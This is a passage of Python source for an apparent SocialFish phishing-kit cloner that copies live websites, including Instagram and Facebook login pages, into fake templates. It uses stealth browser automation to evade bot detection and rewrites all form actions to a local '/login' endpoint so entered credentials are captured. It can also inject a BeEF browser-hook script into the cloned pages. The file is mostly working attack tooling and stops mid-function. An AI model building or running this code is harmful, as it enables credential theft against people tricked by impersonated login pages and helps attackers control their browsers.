#!/usr/bin/env python3
"""
SocialFish Compatible UNIVERSAL Website Cloner - FINAL VERSION
Integrates perfectly with existing SocialFish Flask application
Supports ALL modern websites with advanced stealth and universal compatibility
FIXED: CSS background-image URL rewriting for proper display
"""

import asyncio
import aiohttp
import aiofiles
import json
import re
import os
import time
import random
import hashlib
import mimetypes
import base64
import zlib
import gzip
import brotli
import logging
import threading
import queue
from pathlib import Path
from dataclasses import dataclass, field
from typing import Dict, List, Set, Optional, Tuple, Any, Union
from collections import defaultdict, deque
from concurrent.futures import ThreadPoolExecutor, as_completed
import urllib.parse
import requests  # Add this import at the top
from functools import wraps
import tempfile
import shutil

# Enhanced imports with fallbacks
try:
    from bs4 import BeautifulSoup, Comment
    BS4_AVAILABLE = True
except ImportError:
    BS4_AVAILABLE = False
    print("⚠️ BeautifulSoup not available - using regex fallback")

try:
    from selenium import webdriver
    from selenium.webdriver.chrome.options import Options as ChromeOptions
    from selenium.webdriver.firefox.options import Options as FirefoxOptions
    from selenium.webdriver.common.by import By
    from selenium.webdriver.support.ui import WebDriverWait
    from selenium.webdriver.support import expected_conditions as EC
    from selenium.webdriver.common.action_chains import ActionChains
    from selenium.webdriver.common.keys import Keys
    from selenium.common.exceptions import TimeoutException, WebDriverException
    SELENIUM_AVAILABLE = True
except ImportError:
    SELENIUM_AVAILABLE = False
    print("⚠️ Selenium not available - using requests only")

try:
    import undetected_chromedriver as uc
    UC_AVAILABLE = True
except ImportError:
    UC_AVAILABLE = False

try:
    from playwright.async_api import async_playwright
    PLAYWRIGHT_AVAILABLE = True
except ImportError:
    PLAYWRIGHT_AVAILABLE = False

# Suppress warnings
try:
    import urllib3
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
except ImportError:
    pass
logging.getLogger('urllib3').setLevel(logging.WARNING)

# Setup logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler('socialfish_cloner.log'),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger(__name__)

class SocialFishConfig:
    """Configuration optimized for SocialFish integration"""
    def __init__(self):
        # Performance settings
        self.max_workers = 6
        self.max_concurrent_downloads = 12
        self.request_timeout = 30
        self.page_load_timeout = 45
        
        # Stealth settings
        self.rotate_user_agents = True
        self.mimic_human_behavior = True
        self.use_undetected_chrome = UC_AVAILABLE
        
        # Resource handling
        self.download_images = True
        self.download_fonts = True
        self.download_css = True
        self.download_js = True
        self.process_inline_resources = True
        self.rewrite_urls = True
        
        # Advanced features
        self.render_spa = True
        self.handle_auth_flows = True
        self.capture_api_calls = True
        
        # Error handling
        self.max_retries = 3
        self.retry_delay = 1.0
        self.ignore_ssl_errors = True
        
        # SocialFish specific
        self.output_base = 'templates/fake'
        self.create_index_html = True

class AdvancedUserAgentManager:
    """Advanced user agent management with realistic fingerprints"""
    
    def __init__(self):
        self.agents = self._load_comprehensive_agents()
        self.current_index = 0
    
    def _load_comprehensive_agents(self):
        """Load comprehensive user agent database"""
        return [
            {
                'ua': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36',
                'platform': 'Windows',
                'browser': 'Chrome',
                'mobile': False,
                'headers': {
                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
                    'Accept-Language': 'en-US,en;q=0.9',
                    'Accept-Encoding': 'gzip, deflate, br, zstd',
                    'Sec-Ch-Ua': '"Chromium";v="122", "Not(A:Brand";v="24", "Google Chrome";v="122"',
                    'Sec-Ch-Ua-Mobile': '?0',
                    'Sec-Ch-Ua-Platform': '"Windows"',
                    'Sec-Fetch-Dest': 'document',
                    'Sec-Fetch-Mode': 'navigate',
                    'Sec-Fetch-Site': 'none',
                    'Sec-Fetch-User': '?1'
                }
            },
            {
                'ua': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36',
                'platform': 'macOS',
                'browser': 'Chrome',
                'mobile': False,
                'headers': {
                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
                    'Accept-Language': 'en-US,en;q=0.9',
                    'Accept-Encoding': 'gzip, deflate, br, zstd',
                    'Sec-Ch-Ua': '"Chromium";v="122", "Not(A:Brand";v="24", "Google Chrome";v="122"',
                    'Sec-Ch-Ua-Mobile': '?0',
                    'Sec-Ch-Ua-Platform': '"macOS"'
                }
            },
            {
                'ua': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:122.0) Gecko/20100101 Firefox/122.0',
                'platform': 'Windows',
                'browser': 'Firefox',
                'mobile': False,
                'headers': {
                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
                    'Accept-Language': 'en-US,en;q=0.5',
                    'Accept-Encoding': 'gzip, deflate, br'
                }
            },
            {
                'ua': 'Mozilla/5.0 (iPhone; CPU iPhone OS 17_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.3 Mobile/15E148 Safari/604.1',
                'platform': 'iOS',
                'browser': 'Safari',
                'mobile': True,
                'headers': {
                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                    'Accept-Language': 'en-US,en;q=0.9',
                    'Accept-Encoding': 'gzip, deflate, br'
                }
            }
        ]
    
    def get_agent_for_user_agent(self, user_agent_string):
        """Get agent data for specific user agent string"""
        # Find matching agent or use first as fallback
        for agent in self.agents:
            if agent['ua'] == user_agent_string:
                return agent
        
        # Create dynamic entry for custom UA
        return {
            'ua': user_agent_string,
            'platform': 'Unknown',
            'browser': 'Unknown',
            'mobile': 'Mobile' in user_agent_string,
            'headers': {
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                'Accept-Language': 'en-US,en;q=0.9',
                'Accept-Encoding': 'gzip, deflate, br'
            }
        }

class SocialFishResourceManager:
    """Resource manager optimized for SocialFish directory structure"""
    
    def __init__(self, config: SocialFishConfig):
        self.config = config
        self.session_pool = []
        self.stats = {
            'downloaded': 0,
            'failed': 0,
            'bytes_downloaded': 0,
            'processing_time': 0
        }
        self.downloaded_urls = set()
        self.failed_urls = set()
        # CRITICAL FIX: Track URL mappings for rewriting
        self.url_mappings = {}
    
    async def initialize_sessions(self, user_agent_data):
        """Initialize HTTP sessions"""
        self.session_pool = []
        
        for i in range(3):  # Create 3 sessions
            timeout = aiohttp.ClientTimeout(total=self.config.request_timeout)
            connector = aiohttp.TCPConnector(
                limit=50,
                limit_per_host=10,
                ssl=not self.config.ignore_ssl_errors,
                ttl_dns_cache=300
            )
            
            headers = dict(user_agent_data['headers'])
            headers['User-Agent'] = user_agent_data['ua']
            
            session = aiohttp.ClientSession(
                connector=connector,
                timeout=timeout,
                headers=headers
            )
            
            self.session_pool.append(session)
    
    async def download_resource(self, url: str, resource_type: str, 
                               referer: str = None) -> Optional[Tuple[bytes, Dict[str, Any]]]:
        """Download resource using SYNC requests in async wrapper - BULLETPROOF"""
        if url in self.downloaded_urls or url in self.failed_urls:
            return None
        
        # Run the EXACT working code pattern in a thread
        import concurrent.futures
        import threading
        
        def sync_download():
            """EXACT copy of working code download pattern"""
            try:
                # Create session exactly like working code
                session = requests.Session()
                session.verify = False
                session.timeout = 30
                
                # Headers like working code
                headers = {
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36',
                    'Accept': 'image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8' if resource_type == 'image' else '*/*',
                    'Accept-Language': 'en-US,en;q=0.9',
                    'Accept-Encoding': 'gzip, deflate, br',
                    'Connection': 'keep-alive',
                }
                
                if referer:
                    headers['Referer'] = referer
                
                # EXACT working code request
                response = session.get(url, headers=headers, timeout=30, verify=False)
                
                if response.status_code == 200:
                    # EXACT working code content handling
                    content = response.content  # Raw bytes - this is what works!
                    
                    # EXACT working code decompression
                    encoding = response.headers.get('content-encoding', '').lower()
                    
                    if 'br' in encoding:
                        try:
                            content = brotli.decompress(content)
                        except:
                            pass
                    elif 'gzip' in encoding:
                        try:
                            content = gzip.decompress(content)
                        except:
                            pass
                    elif 'deflate' in encoding:
                        try:
                            content = zlib.decompress(content)
                        except:
                            pass
                    
                    return content, {
                        'url': url,
                        'content_type': response.headers.get('content-type', ''),
                        'size': len(content),
                        'status': response.status_code
                    }
                
                return None
                
            except Exception as e:
                print(f"Download failed: {e}")
                return None
        
        # Run in thread to avoid blocking async loop
        loop = asyncio.get_event_loop()
        with concurrent.futures.ThreadPoolExecutor() as executor:
            future = executor.submit(sync_download)
            try:
                result = await loop.run_in_executor(None, sync_download)
                
                if result:
                    content, metadata = result
                    self.downloaded_urls.add(url)
                    self.stats['downloaded'] += 1
                    self.stats['bytes_downloaded'] += len(content)
                    return content, metadata
                else:
                    self.failed_urls.add(url)
                    self.stats['failed'] += 1
                    return None
                    
            except Exception as e:
                logger.error(f"Thread execution failed: {e}")
                self.failed_urls.add(url)
                self.stats['failed'] += 1
                return None
    
    async def cleanup(self):
        """Cleanup sessions"""
        for session in self.session_pool:
            await session.close()

class SocialFishBrowserManager:
    """Browser manager with advanced stealth for SocialFish"""
    
    def __init__(self, config: SocialFishConfig):
        self.config = config
        self.driver = None
    
    def initialize_browser(self, user_agent: str):
        """Initialize browser with advanced stealth"""
        try:
            if self.config.use_undetected_chrome and UC_AVAILABLE:
                return self._create_undetected_chrome(user_agent)
            elif SELENIUM_AVAILABLE:
                return self._create_selenium_browser(user_agent)
        except Exception as e:
            logger.warning(f"Browser initialization failed: {e}")
        
        return None
    
    def _create_undetected_chrome(self, user_agent: str):
        """Create undetected Chrome instance"""
        try:
            options = uc.ChromeOptions()
            
            stealth_args = [
                '--no-sandbox',
                '--disable-dev-shm-usage',
                '--disable-gpu',
                '--window-size=1920,1080',
                f'--user-agent={user_agent}',
                '--disable-blink-features=AutomationControlled',
                '--disable-web-security',
                '--no-first-run'
            ]
            
            for arg in stealth_args:
                options.add_argument(arg)
            
            options.add_experimental_option('excludeSwitches', ['enable-automation'])
            options.add_experimental_option('useAutomationExtension', False)
            
            driver = uc.Chrome(options=options)
            
            # Additional stealth
            driver.execute_script("Object.defineProperty(navigator, 'webdriver', {get: () => undefined})")
            driver.execute_cdp_cmd('Network.setUserAgentOverride', {"userAgent": user_agent})
            
            return driver
            
        except Exception as e:
            logger.error(f"Undetected Chrome creation failed: {e}")
            return None
    
    def _create_selenium_browser(self, user_agent: str):
        """Create regular Selenium browser"""
        try:
            # Try Chrome first
            options = ChromeOptions()
            options.add_argument('--headless')
            options.add_argument('--no-sandbox')
            options.add_argument('--disable-dev-shm-usage')
            options.add_argument(f'--user-agent={user_agent}')
            options.add_argument('--disable-blink-features=AutomationControlled')
            options.add_experimental_option('excludeSwitches', ['enable-automation'])
            
            driver = webdriver.Chrome(options=options)
            driver.execute_script("Object.defineProperty(navigator, 'webdriver', {get: () => undefined})")
            
            return driver
            
        except Exception:
            # Fallback to Firefox
            try:
                options = FirefoxOptions()
                options.add_argument('--headless')
                options.set_preference('general.useragent.override', user_agent)
                options.set_preference('dom.webdriver.enabled', False)
                
                return webdriver.Firefox(options=options)
                
            except Exception as e:
                logger.error(f"Firefox creation failed: {e}")
                return None
    
    async def render_page(self, url: str) -> Optional[str]:
        """Render page with JavaScript execution"""
        if not self.driver:
            return None
        
        try:
            self.driver.set_page_load_timeout(self.config.page_load_timeout)
            self.driver.get(url)
            
            # Wait for page load
            WebDriverWait(self.driver, 10).until(
                EC.presence_of_element_located((By.TAG_NAME, "body"))
            )
            
            # Simulate human behavior
            if self.config.mimic_human_behavior:
                await self._simulate_human_behavior()
            
            # Trigger lazy loading
            self.driver.execute_script("""
                window.scrollTo(0, document.body.scrollHeight);
                
                // Trigger intersection observers
                document.querySelectorAll('img[data-src]').forEach(img => {
                    if (img.dataset.src) {
                        img.src = img.dataset.src;
                    }
                });
                
                // Dispatch load event
                window.dispatchEvent(new Event('load'));
            """)
            
            await asyncio.sleep(2)
            return self.driver.page_source
            
        except Exception as e:
            logger.error(f"Page rendering failed: {e}")
            return None
    
    async def _simulate_human_behavior(self):
        """Simulate human-like behavior"""
        try:
            # Random scrolling
            for position in [0.2, 0.5, 0.8, 1.0]:
                self.driver.execute_script(f"window.scrollTo(0, document.body.scrollHeight * {position});")
                await asyncio.sleep(random.uniform(0.5, 1.0))
        except Exception:
            pass
    
    def cleanup(self):
        """Cleanup browser"""
        if self.driver:
            try:
                self.driver.quit()
            except Exception:
                pass
            self.driver = None

class SocialFishContentProcessor:
    """Content processor optimized for SocialFish - FIXED CSS BACKGROUND REWRITING"""
    
    def __init__(self, config: SocialFishConfig, resource_manager: SocialFishResourceManager):
        self.config = config
        self.resource_manager = resource_manager
    
    def _is_text_content_type(self, content_type: str, resource_type: str) -> bool:
        """Determine if content should be treated as text"""
        if resource_type in ['css', 'js']:
            return True
        
        if not content_type:
            return resource_type in ['css', 'js']
        
        text_types = [
            'text/', 'application/javascript', 'application/x-javascript',
            'application/json', 'application/xml'
        ]
        
        return any(content_type.lower().startswith(t) for t in text_types)
    
    async def process_html(self, html_content: str, base_url: str, 
                          output_dir: Path, beef_enabled: bool = False) -> str:
        """Process HTML with SocialFish optimizations - FIXED URL REWRITING"""
        
        if not BS4_AVAILABLE:
            return self._process_with_regex(html_content, base_url, output_dir, beef_enabled)
        
        soup = BeautifulSoup(html_content, 'html.parser')
        
        # Remove tracking
        self._remove_tracking_scripts(soup)
        
        # FIXED: Process resources with proper URL mapping
        await self._process_all_resources_with_mapping(soup, base_url, output_dir)
        
        # CRITICAL FIX: Rewrite URLs in HTML after downloading
        self._rewrite_urls_in_html(soup, base_url)
        
        # Create placeholder files for common missing resources
        self._create_placeholder_resources(output_dir)
        
        # Handle forms for SocialFish
        self._process_forms_for_socialfish(soup)
        
        # Add BeEF hook if enabled
        if beef_enabled:
            self._add_beef_hook(soup)
        
        # Add universal AJAX blocking
        self._add_universal_ajax_blocking(soup)
        
        # Add SocialFish JavaScript
        self._add_socialfish_js(soup)
        
        return str(soup)
    
    def _process_with_regex(self, html_content: str, base_url: str, 
                           output_dir: Path, beef_enabled: bool) -> str:
        """Regex-based processing fallback"""
        logger.info("Using regex fallback for HTML processing")
        
        # Basic form processing
        html_content = re.sub(
            r'(<form[^>]*?)action\s*=\s*["\']([^"\']*)["\']([^>]*>)',
            r'\1action="/login" data-original-action="\2"\3',
            html_content, flags=re.IGNORECASE
        )
        
        # Add BeEF hook if enabled
        if beef_enabled:
            beef_script = '<script src="http://localhost:3000/hook.js"></script>'
            html_content = html_content.replace('</body>', beef_script + '</body>')
        
        return html_content
    
    def _remove_tracking_scripts(self, soup: BeautifulSoup):
        """Remove tracking and analytics scripts"""
        tracking_patterns = [
            r'google-analytics\.com',
            r'googletagmanager\.com',
            r'facebook\.net',
            r'doubleclick\.net',
            r'hotjar\.com'
        ]
        
        for script in soup.find_all(['script', 'iframe']):
            src = script.get('src', '')
            if any(re.search(pattern, src, re.I) for pattern in tracking_patterns):
                script.decompose()
    
    async def _process_all_resources_with_mapping(self, soup: BeautifulSoup, base_url: str, output_dir: Path):
        """FIXED: Process all resources and track URL mappings for rewriting"""
        resources = self._discover_resources_comprehensive(soup, base_url)
        
        if not resources:
            return
        
        logger.info(f"🔍 Discovered {len(resources)} resources")
        
        # Create semaphore for controlled concurrency
        semaphore = asyncio.Semaphore(self.config.max_concurrent_downloads)
        tasks = []
        
        for resource_url, element, attr, resource_type in resources:
            task = self._process_single_resource_with_mapping(
                semaphore, resource_url, element, attr, resource_type, base_url, output_dir
            )
            tasks.append(task)
        
        if tasks:
            await asyncio.gather(*tasks, return_exceptions=True)
    
    async def _process_single_resource_with_mapping(self, semaphore: asyncio.Semaphore,
                                                   resource_url: str, element: Any, attr: str,
                                                   resource_type: str, base_url: str, output_dir: Path):
        """FIXED: Process single resource and track URL mapping"""
        async with semaphore:
            try:
                # Resolve URL
                absolute_url = self._resolve_url(resource_url, base_url)
                if not absolute_url:
                    return
                
                # Use universal synchronous download in thread
                loop = asyncio.get_event_loop()
                
                def sync_download():
                    return self._download_sync_universal_enhanced(absolute_url, output_dir, resource_type, base_url)
                
                # Run in thread
                local_path = await loop.run_in_executor(None, sync_download)
                
                if local_path:
                    # CRITICAL FIX: Store URL mapping for later rewriting
                    self.resource_manager.url_mappings[absolute_url] = local_path
                    # Also map original URL if different
                    if resource_url != absolute_url:
                        self.resource_manager.url_mappings[resource_url] = local_path
                    
                    # Update element with local path (for direct src/href attributes)
                    if element and attr in ['src', 'href']:
                        element[attr] = local_path
                
            except Exception as e:
                logger.debug(f"Resource processing failed for {resource_url}: {e}")
    
    def _rewrite_urls_in_html(self, soup: BeautifulSoup, base_url: str):
        """CRITICAL FIX: Rewrite URLs in HTML after all resources are downloaded"""
        
        # Rewrite URLs in style attributes (background-image, etc.)
        for element in soup.find_all(style=True):
            original_style = element.get('style', '')
            if original_style:
                new_style = self._rewrite_urls_in_css_text(original_style, base_url)
                if new_style != original_style:
                    element['style'] = new_style
        
        # Rewrite URLs in <style> tags
        for style_tag in soup.find_all('style'):
            if style_tag.string:
                original_css = style_tag.string
                new_css = self._rewrite_urls_in_css_text(original_css, base_url)
                if new_css != original_css:
                    style_tag.string = new_css
        
        # Additional URL rewriting for any missed src/href attributes
        for element in soup.find_all(['img', 'script', 'link']):
            for attr in ['src', 'href']:
                if element.get(attr):
                    original_url = element[attr]
                    absolute_url = self._resolve_url(original_url, base_url)
                    if absolute_url and absolute_url in self.resource_manager.url_mappings:
                        element[attr] = self.resource_manager.url_mappings[absolute_url]
    
    def _rewrite_urls_in_css_text(self, css_text: str, base_url: str) -> str:
        """CRITICAL FIX: Rewrite URLs in CSS text using mappings"""
        
        def replace_url(match):
            original_url = match.group(1).strip('\'"')
            absolute_url = self._resolve_url(original_url, base_url)
            
            # Check if we have a local mapping for this URL
            if absolute_url and absolute_url in self.resource_manager.url_mappings:
                local_path = self.resource_manager.url_mappings[absolute_url]
                return f'url("{local_path}")'
            elif original_url in self.resource_manager.url_mappings:
                local_path = self.resource_manager.url_mappings[original_url]
                return f'url("{local_path}")'
            
            # Return original if no mapping found
            return match.group(0)
        
        # Replace url() references in CSS
        css_text = re.sub(r'url\s*\(\s*["\']?([^"\'()]+)["\']?\s*\)', replace_url, css_text)
        
        return css_text
    
    def _discover_resources_comprehensive(self, soup: BeautifulSoup, base_url: str) -> List[Tuple[str, Any, str, str]]:
        """ENHANCED: Comprehensive resource discovery for all websites"""
        resources = []
        
        # 1. Standard CSS resources
        for link in soup.find_all('link', rel='stylesheet'):
            href = link.get('href')
            if href and self._is_valid_url_enhanced(href, base_url):
                resources.append((href, link, 'href', 'css'))
        
        # 2. Standard JavaScript resources
        for script in soup.find_all('script', src=True):
            src = script.get('src')
            if src and self._is_valid_url_enhanced(src, base_url):
                resources.append((src, script, 'src', 'js'))
        
        # 3. ENHANCED: Image resources with better type detection
        for img in soup.find_all('img', src=True):
            src = img.get('src')
            if src and self._is_valid_url_enhanced(src, base_url):
                resource_type = self._detect_resource_type_universal(src)
                resources.append((src, img, 'src', resource_type))
        
        # 4. ENHANCED: Font resources
        for link in soup.find_all('link', href=True):
            href = link.get('href')
            if href and self._is_font_resource(href) and self._is_valid_url_enhanced(href, base_url):
                resources.append((href, link, 'href', 'font'))
        
        # 5. NEW: Data attribute resources (lazy loading)
        resources.extend(self._find_data_attribute_resources(soup, base_url))
        
        # 6. NEW: CSS background resources - CRITICAL FOR INSTAGRAM LOGO
        resources.extend(self._find_css_background_resources(soup, base_url))
        
        # 7. NEW: JavaScript embedded resources
        resources.extend(self._find_js_embedded_resources(soup, base_url))
        
        # 8. NEW: SVG specific resources
        resources.extend(self._find_svg_resources(soup, base_url))
        
        # 9. NEW: Dynamic resource patterns
        resources.extend(self._find_dynamic_resources(soup, base_url))
        
        # Remove duplicates while preserving order
        seen = set()
        unique_resources = []
        for resource in resources:
            url = resource[0]
            if url not in seen:
                seen.add(url)
                unique_resources.append(resource)
        
        return unique_resources
    
    def _detect_resource_type_universal(self, url: str) -> str:
        """Universal resource type detection"""
        url_lower = url.lower()
        
        # Handle dynamic resource patterns (like Facebook's rsrc.php)
        if any(pattern in url for pattern in ['/rsrc.php/', '/resource/', '/assets/', '/static/']):
            # Try to detect from URL ending
            if url_lower.endswith('.svg') or '.svg' in url_lower:
                return 'svg'
            elif url_lower.endswith(('.png', '.jpg', '.jpeg', '.gif', '.webp', '.avif')):
                return 'image'
            elif url_lower.endswith('.css'):
                return 'css'
            elif url_lower.endswith('.js'):
                return 'js'
            elif any(ext in url_lower for ext in ['.woff', '.woff2', '.ttf', '.otf']):
                return 'font'
            else:
                return 'asset'
        
        # Standard detection
        if url_lower.endswith('.svg'):
            return 'svg'
        elif url_lower.endswith(('.png', '.jpg', '.jpeg', '.gif', '.webp', '.avif')):
            return 'image'
        elif url_lower.endswith('.css'):
            return 'css'
        elif url_lower.endswith('.js'):
            return 'js'
        elif any(ext in url_lower for ext in ['.woff', '.woff2', '.ttf', '.otf']):
            return 'font'
        
        return 'asset'
    
    def _is_font_resource(self, url: str) -> bool:
        """Check if URL is a font resource"""
        font_extensions = ['.woff', '.woff2', '.ttf', '.otf', '.eot']
        url_lower = url.lower()
        return any(ext in url_lower for ext in font_extensions)
    
    def _find_data_attribute_resources(self, soup: BeautifulSoup, base_url: str) -> List[Tuple[str, Any, str, str]]:
        """Find resources in data attributes (lazy loading)"""
        resources = []
        
        # Common data attributes for lazy loading
        data_attrs = ['data-src', 'data-href', 'data-background', 'data-bg', 'data-original', 'data-lazy']
        
        for attr in data_attrs:
            for element in soup.find_all(attrs={attr: True}):
                src = element.get(attr)
                if src and self._is_valid_url_enhanced(src, base_url):
                    resource_type = self._detect_resource_type_universal(src)
                    resources.append((src, element, attr, resource_type))
        
        return resources
    
    def _find_css_background_resources(self, soup: BeautifulSoup, base_url: str) -> List[Tuple[str, Any, str, str]]:
        """CRITICAL FIX: Find background images and resources in CSS - FIXED FOR INSTAGRAM"""
        resources = []
        
        # Process inline styles - THIS IS WHERE INSTAGRAM LOGO IS
        for element in soup.find_all(style=True):
            style_content = element.get('style', '')
            urls = self._extract_urls_from_css_universal(style_content, base_url)
            for url in urls:
                resource_type = self._detect_resource_type_universal(url)
                # Don't store element reference for style URLs - we'll rewrite them later
                resources.append((url, None, 'style', resource_type))
        
        # Process style tags
        for style_tag in soup.find_all('style'):
            if style_tag.string:
                urls = self._extract_urls_from_css_universal(style_tag.string, base_url)
                for url in urls:
                    resource_type = self._detect_resource_type_universal(url)
                    resources.append((url, None, 'content', resource_type))
        
        return resources
    
    def _extract_urls_from_css_universal(self, css_content: str, base_url: str) -> List[str]:
        """Extract URLs from CSS content - universal patterns"""
        import re
        urls = []
        
        # Comprehensive URL patterns for CSS
        patterns = [
            r'url\s*\(\s*["\']?([^"\'()]+)["\']?\s*\)',  # Standard url()
            r'@import\s+["\']([^"\']+)["\']',  # @import statements
            r'src:\s*url\s*\(\s*["\']?([^"\'()]+)["\']?\s*\)'  # Font src
        ]
        
        for pattern in patterns:
            matches = re.findall(pattern, css_content, re.IGNORECASE)
            for match in matches:
                if self._is_valid_url_enhanced(match, base_url):
                    # Convert relative URLs to absolute
                    absolute_url = self._resolve_url(match, base_url)
                    if absolute_url:
                        urls.append(absolute_url)
        
        return urls
    
    def _find_js_embedded_resources(self, soup: BeautifulSoup, base_url: str) -> List[Tuple[str, Any, str, str]]:
        """Find resources embedded in JavaScript code"""
        resources = []
        
        for script in soup.find_all('script'):
            if script.string:
                js_content = script.string
                urls = self._extract_urls_from_js_universal(js_content, base_url)
                for url in urls:
                    resource_type = self._detect_resource_type_universal(url)
                    resources.append((url, script, 'js-embedded', resource_type))
        
        return resources
    
    def _extract_urls_from_js_universal(self, js_content: str, base_url: str) -> List[str]:
        """Extract URLs from JavaScript content - enhanced universal patterns"""
        import re
        urls = []
        
        # Enhanced JavaScript URL patterns for better coverage
        patterns = [
            # Standard extensions
            r'["\']([^"\']*\.(svg|png|jpg|jpeg|gif|webp|css|js|woff|woff2|ttf|otf|avif|ico))["\']',
            
            # Dynamic resources (Facebook-style, Instagram-style)
            r'["\']([^"\']*\/rsrc\.php\/[^"\']*)["\']',
            r'["\']([^"\']*\/resource\/[^"\']*)["\']',
            r'["\']([^"\']*static\.cdninstagram\.com[^"\']*)["\']',
            r'["\']([^"\']*static\.xx\.fbcdn\.net[^"\']*)["\']',
            
            # Generic resource patterns
            r'["\']([^"\']*\/assets\/[^"\']*\.[a-zA-Z]{2,4})["\']',
            r'["\']([^"\']*\/static\/[^"\']*\.[a-zA-Z]{2,4})["\']',
            r'["\']([^"\']*\/dist\/[^"\']*\.[a-zA-Z]{2,4})["\']',
            r'["\']([^"\']*\/build\/[^"\']*\.[a-zA-Z]{2,4})["\']',
            
            # Chunk files (webpack/modern build systems)
            r'["\']([^"\']*chunk[^"\']*\.[a-zA-Z]{2,4})["\']',
            r'["\']([^"\']*vendors[^"\']*\.[a-zA-Z]{2,4})["\']',
            r'["\']([^"\']*runtime[^"\']*\.[a-zA-Z]{2,4})["\']',
            
            # JavaScript object properties
            r'src\s*:\s*["\']([^"\']+\.[a-zA-Z]{2,4})["\']',
            r'url\s*:\s*["\']([^"\']+\.[a-zA-Z]{2,4})["\']',
            r'href\s*:\s*["\']([^"\']+\.[a-zA-Z]{2,4})["\']',
            
            # Import/require statements
            r'import\s+[^"\']*["\']([^"\']+\.[a-zA-Z]{2,4})["\']',
            r'require\s*\(\s*["\']([^"\']+\.[a-zA-Z]{2,4})["\']',
            
            # Webpack-style URLs
            r'__webpack_require__\.[a-zA-Z]+\s*\(\s*["\']([^"\']+)["\']',
            
            # Module federation and dynamic imports
            r'import\s*\(\s*["\']([^"\']+)["\']',
            r'loadChunk\s*\(\s*["\']([^"\']+)["\']',
        ]
        
        for pattern in patterns:
            matches = re.findall(pattern, js_content, re.IGNORECASE)
            for match in matches:
                url = match[0] if isinstance(match, tuple) else match
                
                # Skip very short URLs or obvious non-resources
                if len(url) < 4 or url.startswith(('#', 'data:', 'blob:')):
                    continue
                
                if self._is_valid_url_enhanced(url, base_url):
                    absolute_url = self._resolve_url(url, base_url)
                    if absolute_url:
                        urls.append(absolute_url)
        
        return urls
    
    def _find_svg_resources(self, soup: BeautifulSoup, base_url: str) -> List[Tuple[str, Any, str, str]]:
        """Find SVG-specific resources"""
        resources = []
        
        # Process inline SVG elements
        for svg_elem in soup.find_all('svg'):
            # Find image references within SVG
            for image in svg_elem.find_all('image'):
                href = image.get('href') or image.get('xlink:href')
                if href and self._is_valid_url_enhanced(href, base_url):
                    resources.append((href, image, 'href', 'image'))
            
            # Find use elements with external references
            for use in svg_elem.find_all('use'):
                href = use.get('href') or use.get('xlink:href')
                if href and href.startswith('http') and self._is_valid_url_enhanced(href, base_url):
                    resources.append((href, use, 'href', 'svg'))
        
        return resources
    
    def _find_dynamic_resources(self, soup: BeautifulSoup, base_url: str) -> List[Tuple[str, Any, str, str]]:
        """Find dynamic resource patterns specific to various platforms"""
        resources = []
        
        # Search for any element with URL-like attributes
        url_attributes = ['src', 'href', 'data-src', 'data-href', 'data-url', 'data-image', 'content']
        
        for attr in url_attributes:
            for element in soup.find_all(attrs={attr: True}):
                value = element.get(attr)
                if value and self._looks_like_resource_url(value) and self._is_valid_url_enhanced(value, base_url):
                    resource_type = self._detect_resource_type_universal(value)
                    resources.append((value, element, attr, resource_type))
        
        return resources
    
    def _looks_like_resource_url(self, url: str) -> bool:
        """Check if a string looks like a resource URL"""
        if not url or len(url) < 4:
            return False
        
        # Skip non-URL strings
        if url.startswith(('javascript:', 'data:', 'blob:', 'mailto:', 'tel:', '#')):
            return False
        
        # Look for file extensions or resource patterns
        resource_indicators = [
            r'\.(svg|png|jpg|jpeg|gif|webp|css|js|woff|woff2|ttf|otf|avif)',
            r'/rsrc\.php/',
            r'/resource/',
            r'/assets/',
            r'/static/',
            r'/images/',
            r'/css/',
            r'/js/',
            r'/fonts/'
        ]
        
        return any(re.search(pattern, url, re.IGNORECASE) for pattern in resource_indicators)
    
    def _resolve_url(self, url: str, base_url: str) -> Optional[str]:
        """Resolve relative URL to absolute URL"""
        try:
            if not url or url.startswith(('data:', 'blob:', 'javascript:')):
                return None
            
            if url.startswith('//'):
                scheme = urllib.parse.urlparse(base_url).scheme
                return f"{scheme}:{url}"
            elif not url.startswith(('http://', 'https://')):
                return urllib.parse.urljoin(base_url, url)
            else:
                return url
        except Exception:
            return None
    
    def _is_valid_url_enhanced(self, url: str, base_url: str) -> bool:
        """Enhanced URL validation for universal compatibility"""
        if not url or url.startswith(('data:', 'blob:', 'javascript:', 'mailto:', 'tel:', '#')):
            return False
        
        # Allow dynamic resource patterns
        dynamic_patterns = ['/rsrc.php/', '/resource/', '/assets/', '/static/']
        if any(pattern in url for pattern in dynamic_patterns):
            return True
        
        # Enhanced domain handling
        allowed_patterns = ['facebook.com', 'fbcdn.net', 'fbsbx.com', 'instagram.com', 'cdninstagram.com', 'twitter.com', 'x.com', 'linkedin.com']
        skip_domains = ['fonts.googleapis.com', 'cdnjs.cloudflare.com']
        
        try:
            if url.startswith('//'):
                scheme = urllib.parse.urlparse(base_url).scheme
                url = f"{scheme}:{url}"
            elif not url.startswith(('http://', 'https://')):
                return True  # Relative URL
            
            parsed = urllib.parse.urlparse(url)
            
            # Skip known external CDNs
            if any(domain in parsed.netloc for domain in skip_domains):
                return False
            
            # Allow same domain or common platforms
